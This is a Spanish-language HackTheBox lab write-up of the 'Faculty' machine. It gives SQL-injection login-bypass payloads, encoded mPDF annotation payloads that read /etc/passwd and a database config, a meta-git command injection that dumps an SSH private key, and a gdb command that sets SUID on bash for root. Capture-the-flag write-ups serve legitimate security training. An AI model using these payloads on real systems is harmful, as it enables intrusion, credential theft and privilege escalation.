---
layout      : post
title       : "Faculty - HackTheBox"
author      : elc4br4
image       : assets/images/HTB/Faculty-HackTheBox/Faculty.webp
category    : [ htb ]
tags        : [ Linux ]
---

En esta máquina Linux de nivel medio tocaremos un poco de sqli, una explotación muy chula a través de archivos pdf, escalada de privilegios con meta-git y a través de gdb aprovechándonos de un proceso que se ejecuta como root para pivotar al usuario administrador.

🎥Canal Writeups Youtube🎬 --> [https://www.youtube.com/channel/UCllewdxU0OQudNp9-1IVJYQ](https://www.youtube.com/channel/UCllewdxU0OQudNp9-1IVJYQ)

![](/assets/images/HTB/Faculty-HackTheBox/faculty2.webp)

![](/assets/images/HTB/Faculty-HackTheBox/faculty-rating.webp)

[![HTBadge](https://www.hackthebox.eu/badge/image/533771)](https://www.hackthebox.com/home/users/profile/533771)


***


**Un pequeño INDICE**

1. [Reconocimiento](#reconocimiento).
    * [Reconocimiento de Puertos](#recon-nmap).
2. [Enumeración](#enumeración).
    * [Enumeración Web](#enum-web).
3. [Explotación](#explotacion).
    * [mpdf](#mpdf).
4. [Escalada de Privilegios](#privesc). 
    * [meta-git](#meta-git)
    * [gdb](#gdb)
    
    
***

# Reconocimiento [#](reconocimiento) {#reconocimiento}

***

## Reconocimiento de Puertos [🔍](#recon-nmap) {#recon-nmap}

Comenzamos lanzando la utilidad WhichSystem.py para identificar el sistema operativo de la máquina víctima.

![](/assets/images/HTB/Faculty-HackTheBox/whichsystem.webp)

Una vez se que me estoy enfrentando a una `máquina Linux`, ya procedo a lanzar un `escaneo de puertos` para descubrir puertos abiertos en la máquina víctima a través de la herramienta `nmap`.

```nmap
PORT  STATE SERVICE
22/tcp open  ssh
80/tcp open  hhtp
```

Tenemos abiertos los puertos 22 y 80, pero necesito saber algo más de información acerca de los mismos, tal como los `servicios` que se ejecutan en cada puerto la `versión` del mismo.

```bash
 # Comando usado para el escaneo 
 -------------------------------
 nmap -p22,80 -n -sCV 10.10.11.169 -oN servicios
```

![](/assets/images/HTB/Faculty-HackTheBox/nmap.webp)

Ahora ya tenemos más infrmación al respecto que detallaré en una tabla

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 22     | ssh      | OpenSSH 8.2p1 Ubuntu |
| 80     | http     | nginx 1.18.0 Ubuntu |

> Dominio faculty.htb

* Añado el dominio `faculty.htb` al archivo hosts ubicado en la ruta `/etc/hosts`

Una vez añadido ya procedo a lanzar una utilidad conocida como whatweb para sacar algo más de info del servidor web.

![](/assets/images/HTB/Faculty-HackTheBox/whatweb.webp)

Encuentro varias cositas interesantes:

* El título es School Faculty Scheduling System
* Tenemos un login -> [http://faculty.htb/login.php](http://faculty.htb/login.php)

A continuación procedo a enumerar el servidor web.

# Enumeración [#](enumeración) {#enumeración}

***

## Enumeración Web [🔢](#enum-web) {#enum-web}

Accedo al dominio `faculty.htb` y nos redirige al `login.php`.

Me encuentro con lo siguiente:

![](/assets/images/HTB/Faculty-HackTheBox/web1.webp)

Parece que debemos ingresar un id, por lo que abro burpsuite para capturar la petición e inserto un id al azar.

![](/assets/images/HTB/Faculty-HackTheBox/burp1.webp)

Primeramente voy a comprobar si el id podría ser vulnerable a sql y así iniciar sesión.

Asique voy a añadir una comilla en el campo del id, y si nos arroja un error significa que es vulnerable a sqli.

![](/assets/images/HTB/Faculty-HackTheBox/burp2.webp)

Por lo visto, es vulnerable a sqli, asique pruebo a meter algún payload sqli.

Metiendo una lista simple de inyecciones sql simples a través del intruder encuentro varias inyecciones que podrían servirme:

```bash
# Payloads SQL
--------------
´ OR ´1
´ or 1 -- - 
´ OR " = ´
´=´
´ or ´x´=´x
´ or 1=1#
```

Al introducir uno de estos payloads sql en el campo id del servidor web podremos acceder al mismo.

![](/assets/images/HTB/Faculty-HackTheBox/web2.webp)

Pero no hay nada de interés por lo que voy a fuzzear rutas en el servidor con la herramienta feroxbuster.

![](/assets/images/HTB/Faculty-HackTheBox/feroxbuster.webp)

Encuentro una ruta de interés `/admin` asique voy a ver que encuentro dentro.

Es un panel de administrador del servicio web, y navegando un poco encuentro lo siguiente.

![](/assets/images/HTB/Faculty-HackTheBox/web3.webp)

Parece que podemos descargar un pdf, de igual forma que anteriormente, capturaré la petición para ver que obtenemos.

![](/assets/images/HTB/Faculty-HackTheBox/burp3.webp)

Tenemos data encodeada en lo que parecer ser base64, asique voy a decodearla.

![](/assets/images/HTB/Faculty-HackTheBox/cyberchef1.webp)

Parece que a su vez está url encodeado, asique lo decodeo también dos veces.

![](/assets/images/HTB/Faculty-HackTheBox/cyberchef2.webp)

Tenemos lo que parecen etiquetas html... pero antes de hacer nada voy a descargar el pdf sin capturar la petición.

![](/assets/images/HTB/Faculty-HackTheBox/mpdf.webp)

Tenemos en la ruta del archivo el directorio mpdf, podría ser algún tipo de tecnología parecido a pdf y además podría tener alguna vulnerabilidad... voy a mirar...

# Explotación [#](explotación) {#explotación}

***

## mpdf [🔢](#mpdf) {#mpdf}

![](/assets/images/HTB/Faculty-HackTheBox/searchsploit.webp)

Tenemos dos vulnerabilidades, en mi caso descargo el exploit en python y lo analizo antes de ejecutarlo.

![](/assets/images/HTB/Faculty-HackTheBox/exploit.webp)

Al analizar el exploit veo que lo que hace es generar una línea con el siguiente contenido y lo urlencodea y lo encodea de nuevo en base64.

```bash
# Genera un archivo con este contenido.
--------------------------------------
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />

# Lo urlencodea x2 y lo encodea de nuevo en base64
--------------------------------------------------
JTI1M0Nhbm5vdGF0aW9uJTI1MjBmaWxlPSUyNTIyL2V0Yy9wYXNzd2QlMjUyMiUyNTIwY29udGVudD0lMjUyMi9ldGMvcGFzc3dkJTI1MjIlMjUyMGljb249JTI1MjJHcmFwaCUyNTIyJTI1MjB0aXRsZT0lMjUyMkF0dGFjaGVkJTI1MjBGaWxlOiUyNTIwL2V0Yy9wYXNzd2QlMjUyMiUyNTIwcG9zLXg9JTI1MjIxOTUlMjUyMiUyNTIwLyUyNTNF
```

Por lo tanto si metemos esto dentro del Burpsuite en la petición capturada y la enviamos se nos debería generar un archivo pdf con el archivo passwd.

![](/assets/images/HTB/Faculty-HackTheBox/burp4.webp)

Al hacer click en Forward se nos abrirá una ventana en el navegador con el archivo pdf, y haremos click en el icono del clip y veremos el archivo passwd que descargaremos y leeremos.

![](/assets/images/HTB/Faculty-HackTheBox/passwd1.webp)

![](/assets/images/HTB/Faculty-HackTheBox/passwd2.webp)

Ahora ya sabemos que tenemos el `usuario developer, gbyolo y el usuario root.`

Intenté leer el archivo passwd pero no hubo suerte, asique llegados a este punto se me ocurre intentar leer algún archivo php del servidor web, y si vuelvo para trás puedo ver que teníamos varios archivos que nos reportó el fuzzeo, pero para asegurarme buscaré más archivos con extensión php usando gobuster.

![](/assets/images/HTB/Faculty-HackTheBox/gobuster.webp)

Tenemos un archivo que me llama la atención, que es el archivo `db_connect.php`

Asique voy a intentar leerlo, pero existse un problema, desconozco la ruta de ese archivo en el sistema... Pero recuerdo que al comienzo al intentar probar la inyección sql me apareció un error con la ruta `/var/www/scheduling/admin/admin_class.php` y además acabo de descubri también el archivo admin_class.php.

* Primeramente voy a intentar leer el archivo db_connect.php de igual forma que leí el archivo passwd.

```bash
# Genera un archivo con este contenido.
--------------------------------------
<annotation file="/var/www/schedule/admin/db_connect.php" content="/var/www/schedule/admin/db_connect.php" icon="Graph" title="Attached File: /var/www/schedule/admin/db_connect.php" pos-x="195" />

# Lo urlencodea x2 y lo encodea de nuevo en base64
--------------------------------------------------
JTI1M0Nhbm5vdGF0aW9uJTI1MjBmaWxlPSUyNTIyL3Zhci93d3cvc2NoZWR1bGUvYWRtaW4vZGJfY29ubmVjdC5waHAlMjUyMiUyNTIwY29udGVudD0lMjUyMi92YXIvd3d3L3NjaGVkdWxlL2FkbWluL2RiX2Nvbm5lY3QucGhwJTI1MjIlMjUyMGljb249JTI1MjJHcmFwaCUyNTIyJTI1MjB0aXRsZT0lMjUyMkF0dGFjaGVkJTI1MjBGaWxlOiUyNTIwL3Zhci93d3cvc2NoZWR1bGUvYWRtaW4vZGJfY29ubmVjdC5waHAlMjUyMiUyNTIwcG9zLXg9JTI1MjIxOTUlMjUyMiUyNTIwLyUyNTNF
```

![](/assets/images/HTB/Faculty-HackTheBox/db.webp)

Y encuentro lo que parece ser una credencial... 

Intentaré loguearme con estas credenciales y uno de los usuarios a través de ssh.

![](/assets/images/HTB/Faculty-HackTheBox/ssh1.webp)

Y consigo loguearme con el usuario gbyolo y la credencial que encontré.

Intento leer la user flag pero para poder leerla he de convertirme en el usuario `developer`.

# Escalada de Privilegios [#](reconocimiento) {#reconocimiento}

***

## meta-git [🔍](#meta-git) {#meta-git}


Lanzo el comando `sudo -l` y veo que puedo ejecutar como el usuario developer `/usr/local/bin/meta-git`.

Busco información en google al respecto y encuentro este artículo.

[https://hackerone.com/reports/728040](https://hackerone.com/reports/728040)

En este artículo podemos ver como a través de meta-git podemos leer archivos del sistema, en este caso intentaré leer el archivo id_rsa del usuario developer.

```bash
# Comando para obtener rsa del usuario developer
-----------------------------------------------
sudo -u developer meta-git clone ´elc4br4 | cat /home/developer/.ssh/id_rsa´
```

Obtengo el id_rsa, lo copio a mi máquina local le asigno permisos `chmod 400` y me logueo con el usuario developer usando la rsa.

![](/assets/images/HTB/Faculty-HackTheBox/ssh2.webp)

Ahora ya puedo leer la flag user.txt.

![](/assets/images/HTB/Faculty-HackTheBox/user.webp)

A continuación toca pivotar al usuario root para poder visualizar la flag root.txt.

## gdb [🔍](#gdb) {#gdb}

Para encontrar vectores de escalada lanzo linpeas.sh que se puede descargar desde este repositorio de Github.
[https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

Lo descargo y lo paso a la máquina víctima a través de un `servidor de python3`.

Lo lanzo y encuentro algo interesante:

![](/assets/images/HTB/Faculty-HackTheBox/gdb.webp)

En este caso podríamos usar gdb.

Aprovechándonos de un proceso que se ejecute como root podríamos usar gdb para asignar permisos suid a la bash y así convertirme en root.

1. Identificamos un proceso que se ejecute como root

![](/assets/images/HTB/Faculty-HackTheBox/ps.webp)

2. Con gdb asignamos suid a la bash aprovechando el proceso.

```bash
gdb -p 735
----------
call (void)system("chmod u+s /bin/bash")
quit
```

3. Una vez hemos asigando suid a la bash ejecutamos `bash p` y ya seremos root y podremos leer la flag root.txt

![](/assets/images/HTB/Faculty-HackTheBox/root.webp)







































